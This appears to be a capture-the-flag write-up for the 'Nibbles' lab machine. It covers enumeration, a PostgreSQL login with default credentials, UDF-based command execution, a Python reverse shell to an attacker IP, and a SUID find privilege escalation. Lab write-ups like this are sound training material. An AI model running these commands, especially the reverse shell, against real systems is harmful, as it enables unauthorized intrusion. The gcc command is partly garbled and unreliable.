---
description: Writeup for Nibbles from Offensive Security Proving Grounds (PG)
---

# Nibbles

## Nibbles

### Service Enumeration

`nmapAutomator.sh -H 192.168.163.47 -t full`

![](../../.gitbook/assets/1540aa15138b4fb6b87da0c16f81a23b.png)

`nmapAutomator.sh -H 192.168.163.47 -t vulns`

* Anonymous FTP not allowed

### Subdirectory Enumeration

`gobuster dir -u http://192.168.163.47/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x .txt,.html --threads 50`

### PostgreSQL

We know the default username is `postgres`. Trying the password `postgres`, we authenticate successfully.

![](../../.gitbook/assets/e98a3452c71040f3891fcbbd9718e443.png)

Note that we are a privileged account, with the Superuser role.

![](../../.gitbook/assets/9de57a70204a45eb823cb8ddb8e8d026.png)

## Exploitation

Reference: [https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1](https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1)

Compile the shared library:

`gcc lib_postgresqlugcc lib_postgresqludf_sys.c -I server -fPIC -shared -o udf64.so`

Generate the `.psql` payload:

```
xxd -p udf64.so | tee udf.txt
x=0
while read line; do echo "select lo_put(PLACEHOLDER, $x, '\\\x$line');" >> u.psql; x=$((x+30)); done < udf.txt
```

Create and get the ID of the object:

![](../../.gitbook/assets/f221361282f64e6b9013b8836cd55bd5.png)

Replace PLACEHOLDER in `u.psql` with 16385.

![](../../.gitbook/assets/b47d67741d444352b2a7222c58f43ad0.png)

Deliver the payload: `psql -h 192.168.163.47 -p 5437 -U postgres -d postgres -f u.psql`

`select lo_export(16385, '/tmp/exploit.so');`

![](../../.gitbook/assets/d6134a3d60044c4196eeebec2e0b8166.png)

`create or replace function exec(char) returns char as '/tmp/exploit.so','sys_eval' language c strict;`

![](../../.gitbook/assets/99232dceadc64149a730060ed5230aff.png)

At this point we have created a function that allows us to execute arbitrary commands.

Verify Python is installed: `select exec('which python');`

![](../../.gitbook/assets/ace8f49532204b00bbfdf6bcf49d9d09.png)

**Note: the only port that works is port 80. **Since the web application would be communicating with the PostgreSQL service through port 80, port 80 is likely whitelisted.

```
select exec('python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.163",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")''');
```

![](../../.gitbook/assets/4d1ba1f89f5a4ae38d82aa3c092c4b71.png)

![](../../.gitbook/assets/73d3433cdccf4cceb8609fda74080f53.png)

### Privilege Escalation

We can use LinPEAS to enumerate.

![](../../.gitbook/assets/014387c27ed84d63ad418bed672c6845.png)

We see that the `find` binary has the SUID bit set.

Reference: [https://gtfobins.github.io/gtfobins/find/](https://gtfobins.github.io/gtfobins/find/)

We can leverage this to run `/bin/sh` with elevated privileges.

![](../../.gitbook/assets/7d5d16d938ef42eba9a1676b91079876.png)

![](../../.gitbook/assets/84c7b92b17e04ffb8e525f5f81066c77.png)
